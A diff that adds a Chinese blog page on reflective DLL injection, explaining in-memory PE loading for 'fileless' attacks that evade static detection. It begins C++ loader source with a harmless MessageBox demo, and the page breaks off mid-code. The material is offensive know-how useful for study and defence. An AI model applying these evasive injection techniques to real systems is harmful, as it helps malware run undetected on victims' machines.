@@ -1,0 +1,724 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1b1b26">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="反射DLL注入是一种高级的注入技术，其核心在于完全在内存中模拟 Windows 加载器（PE Loader）的行为。与传统的 LoadLibrary 注入不同，它不需要将 DLL 文件保存在磁盘上，从而实现了“无文件落地”攻击，规避了基于文件的静态检测。 本文档包含完整的反射注入实现代码，分为两部分：  ReflectiveLoader: 编写在 DLL 内部的自举导出函数，负责将自身正确加载到内">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反射DLL注入 (Reflective DLL Injection)">
+<meta property="og:url" content="http://candyb0x.github.io/2025/12/20/%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5-Reflective-DLL-Injection/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="反射DLL注入是一种高级的注入技术，其核心在于完全在内存中模拟 Windows 加载器（PE Loader）的行为。与传统的 LoadLibrary 注入不同，它不需要将 DLL 文件保存在磁盘上，从而实现了“无文件落地”攻击，规避了基于文件的静态检测。 本文档包含完整的反射注入实现代码，分为两部分：  ReflectiveLoader: 编写在 DLL 内部的自举导出函数，负责将自身正确加载到内">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-20T04:01:32.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:47:16.907Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="免杀对抗">
+<meta property="article:tag" content="反射Dll">
+<meta property="article:tag" content="dll">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>反射DLL注入 (Reflective DLL Injection) - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="反射DLL注入 (Reflective DLL Injection)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-20 12:01" pubdate>
+          2025年12月20日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">反射DLL注入 (Reflective DLL Injection)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>反射DLL注入是一种高级的注入技术，其核心在于<strong>完全在内存中模拟 Windows 加载器（PE Loader）的行为</strong>。与传统的 <code>LoadLibrary</code> 注入不同，它不需要将 DLL 文件保存在磁盘上，从而实现了“无文件落地”攻击，规避了基于文件的静态检测。</p>
+<p>本文档包含完整的反射注入实现代码，分为两部分：</p>
+<ol>
+<li><strong>ReflectiveLoader</strong>: 编写在 DLL 内部的自举导出函数，负责将自身正确加载到内存并执行。</li>
+<li><strong>ReflectiveInjection</strong>: 运行在本地的注入器，负责将 DLL 写入目标进程并触发 ReflectiveLoader。</li>
+</ol>
+<p><strong>原理</strong>: 标准的 OS 加载器会将 PE 文件从磁盘的“文件对齐”状态映射到内存的“页对齐”状态。反射注入需要手动完成这一步。</p>
+<p>为了简化注入器与 Shellcode 的交互，通常采用一种特殊的内存布局：</p>
+<ol>
+<li><strong>Raw Data 区</strong>: 存放原始的 DLL 文件二进制数据。这是注入器写入的初始状态。</li>
+<li><strong>Virtual Image 区</strong>: 存放展开后的、可执行的 DLL 镜像。这是反射加载器“自我安装”的目标区域。</li>
+</ol>
+<h1 id="1-反射加载器-ReflectiveLoader"><a href="#1-反射加载器-ReflectiveLoader" class="headerlink" title="1. 反射加载器 ReflectiveLoader"></a>1. 反射加载器 ReflectiveLoader</h1><h2 id="1-1-原理描述"><a href="#1-1-原理描述" class="headerlink" title="1.1 原理描述"></a>1.1 原理描述</h2><p><strong>原理</strong>: 这是 DLL 的自举过程。代码当前运行在 Raw Data 区，环境是不稳定的（重定位未修复、导入表未初始化）。目标是构建一个干净的 Virtual Image 区并转移控制权。</p>
+<p>该项目中给出的代码是反射 dll 的 demo实现。真正的反射 dll 利用需要进一步的实现对 ReflectiveLoader 代码进行修改。</p>
+<p>该 ReflectiveLoader 会将 dll 文件从系统的“文件对齐”状态在系统运行过程中进行内存布局修改迁移，将原先以系统“文件对齐”方式加载到内存中的 dll 映射成 “页对齐”的状态，使系统能够将布局后的 dll 作为程序执行，调用其中的导出函数。</p>
+<h2 id="1-2-代码实现"><a href="#1-2-代码实现" class="headerlink" title="1.2 代码实现"></a>1.2 代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function">BOOL <span class="hljs-title">ReflectLoader</span><span class="hljs-params">(<span class="hljs-type">char</span>* pDll)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CompareDllName</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* dllName, <span class="hljs-type">wchar_t</span>* targetDllName)</span></span>;<br><span class="hljs-function"><span class="hljs-type">wchar_t</span>* <span class="hljs-title">ExtractDllName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* fullDllName)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">my_wctomb</span><span class="hljs-params">(<span class="hljs-type">char</span>* dest, <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* src)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CompareStrings</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* str1, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* str2)</span></span>;<br><span class="hljs-comment">// DLL入口点函数</span><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Hello from Reflective DLL!&quot;</span>, <span class="hljs-string">&quot;DllMain&quot;</span>, MB_OK);<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">// 自定义的宽字符转普通字符的函数</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">my_wctomb</span><span class="hljs-params">(<span class="hljs-type">char</span>* dest, <span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* src)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (*src) &#123;<br>        <span class="hljs-keyword">if</span> (*src &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; *src &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) &#123;<br>            *dest = (<span class="hljs-type">char</span>)(*src + (<span class="hljs-string">L&#x27;a&#x27;</span> - <span class="hljs-string">L&#x27;A&#x27;</span>));  <span class="hljs-comment">// 转换大写字符为小写</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*src &gt;= <span class="hljs-string">L&#x27;a&#x27;</span> &amp;&amp; *src &lt;= <span class="hljs-string">L&#x27;z&#x27;</span>) &#123;<br>            *dest = (<span class="hljs-type">char</span>)*src;  <span class="hljs-comment">// 保留小写字符</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*src &gt;= <span class="hljs-string">L&#x27;0&#x27;</span> &amp;&amp; *src &lt;= <span class="hljs-string">L&#x27;9&#x27;</span>) &#123;<br>            *dest = (<span class="hljs-type">char</span>)*src;  <span class="hljs-comment">// 保留数字字符</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            *dest = <span class="hljs-string">&#x27;?&#x27;</span>;  <span class="hljs-comment">// 对于其他字符，可以选择替代字符，例如 &#x27;？&#x27;</span><br>        &#125;<br>        dest++;<br>        src++;<br>    &#125;<br>    *dest = <span class="hljs-string">&#x27;\0&#x27;</span>;  <span class="hljs-comment">// 确保目标字符串以 null 结尾</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CompareStrings</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* str1, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* str2)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (*str2 != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (*str1 != *str2) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回差值</span><br>        &#125;<br>        str1++;<br>        str2++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 两个字符串完全匹配时返回0</span><br>&#125;<br><span class="hljs-comment">// 比较两个 DLL 名称（大小写不敏感）</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">CompareDllName</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* dllName, <span class="hljs-type">wchar_t</span>* targetDllName)</span> </span>&#123;<br>    <span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (dllName[i] != <span class="hljs-string">L&#x27;\0&#x27;</span> || targetDllName[i] != <span class="hljs-string">L&#x27;\0&#x27;</span>) &#123;<br>        <span class="hljs-comment">// 将两个字符都转换为小写进行比较</span><br>        <span class="hljs-type">wchar_t</span> ch1 = (dllName[i] &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; dllName[i] &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) ? dllName[i] + (<span class="hljs-string">L&#x27;a&#x27;</span> - <span class="hljs-string">L&#x27;A&#x27;</span>) : dllName[i];<br>        <span class="hljs-type">wchar_t</span> ch2 = (targetDllName[i] &gt;= <span class="hljs-string">L&#x27;A&#x27;</span> &amp;&amp; targetDllName[i] &lt;= <span class="hljs-string">L&#x27;Z&#x27;</span>) ? targetDllName[i] + (<span class="hljs-string">L&#x27;a&#x27;</span> - <span class="hljs-string">L&#x27;A&#x27;</span>) : targetDllName[i];<br><br>        <span class="hljs-comment">// 如果字符不同，则返回比较结果</span><br>        <span class="hljs-keyword">if</span> (ch1 != ch2) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        i++;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果字符串都没有结束且匹配到最后，返回 0 表示完全相等</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 如果两个字符串完全相同，返回 0</span><br>&#125;<br><br><span class="hljs-comment">// 提取 DLL 名称的函数</span><br><span class="hljs-function"><span class="hljs-type">wchar_t</span>* <span class="hljs-title">ExtractDllName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* fullDllName)</span> </span>&#123;<br>    <span class="hljs-type">wchar_t</span>* fileName = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">wchar_t</span>* temp = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br><br>    <span class="hljs-comment">// 遍历并找到最后一个 &#x27;\\&#x27;，获取文件名部分</span><br>    <span class="hljs-keyword">while</span> (*temp) &#123;<br>        <span class="hljs-keyword">if</span> (*temp == <span class="hljs-string">L&#x27;\\&#x27;</span>) &#123;<br>            fileName = temp + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 更新文件名的位置</span><br>        &#125;<br>        temp++;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果没有找到 &#x27;\\&#x27;，则认为整个字符串就是文件名</span><br>    <span class="hljs-keyword">if</span> (!fileName) &#123;<br>        fileName = (<span class="hljs-type">wchar_t</span>*)fullDllName;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> fileName;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function">BOOL <span class="hljs-title">ReflectLoader</span><span class="hljs-params">(<span class="hljs-type">char</span>* pDll)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取磁盘文件的DOS头和NT头</span><br>    PIMAGE_DOS_HEADER pDOSheader = (PIMAGE_DOS_HEADER)pDll;                             <span class="hljs-comment">//赋值DOS头</span><br>    PIMAGE_NT_HEADERS pNTheader = (PIMAGE_NT_HEADERS)(pDll + pDOSheader-&gt;e_lfanew); <span class="hljs-comment">//赋值NT头</span><br><br>    <span class="hljs-comment">//给内存分配空间，并对pAlloc进行初始化</span><br>    DWORD ImageSize = pNTheader-&gt;OptionalHeader.SizeOfImage;  <span class="hljs-comment">//内存空间大小</span><br>    PBYTE pAlloc = (PBYTE)((ULONG_PTR)pDll + ImageSize);<br><br>    <span class="hljs-keyword">if</span> (pAlloc == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> FALSE;<br>    <span class="hljs-keyword">if</span> (pDOSheader-&gt;e_magic != IMAGE_DOS_SIGNATURE || pNTheader-&gt;Signature != IMAGE_NT_SIGNATURE) <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 无效的头，直接退出</span><br><br><br>    <span class="hljs-comment">// 手动实现 CopyMemory 的功能</span><br>    BYTE* dst = (BYTE*)pAlloc;               <span class="hljs-comment">// 目标内存地址</span><br>    BYTE* src = (BYTE*)pDll;                 <span class="hljs-comment">// 源内存地址</span><br>    <span class="hljs-type">size_t</span> size = pNTheader-&gt;OptionalHeader.SizeOfHeaders; <span class="hljs-comment">// 需要复制的字节数</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        dst[i] = src[i];                     <span class="hljs-comment">// 逐字节复制</span><br>    &#125;<br><br>    <span class="hljs-comment">//复制节区表</span><br>    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)pNTheader + <span class="hljs-built_in">sizeof</span>(IMAGE_NT_HEADERS));<br>    DWORD SecNum = pNTheader-&gt;FileHeader.NumberOfSections;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SecNum; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pSec-&gt;SizeOfRawData == <span class="hljs-number">0</span> || pSec-&gt;PointerToRawData == <span class="hljs-number">0</span>) &#123;<br>            pSec++;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-type">char</span>* chSrcMem = (<span class="hljs-type">char</span>*)((ULONG_PTR)pDll + (DWORD)(pSec-&gt;PointerToRawData));<br>        <span class="hljs-type">char</span>* chDestMem = (<span class="hljs-type">char</span>*)((ULONG_PTR)pAlloc + (DWORD)(pSec-&gt;VirtualAddress));<br>        DWORD dwSizeOfRawData = pSec-&gt;SizeOfRawData;<br>        DWORD dwVirtualSize = pSec-&gt;Misc.VirtualSize;<br>        <span class="hljs-keyword">for</span> (DWORD j = <span 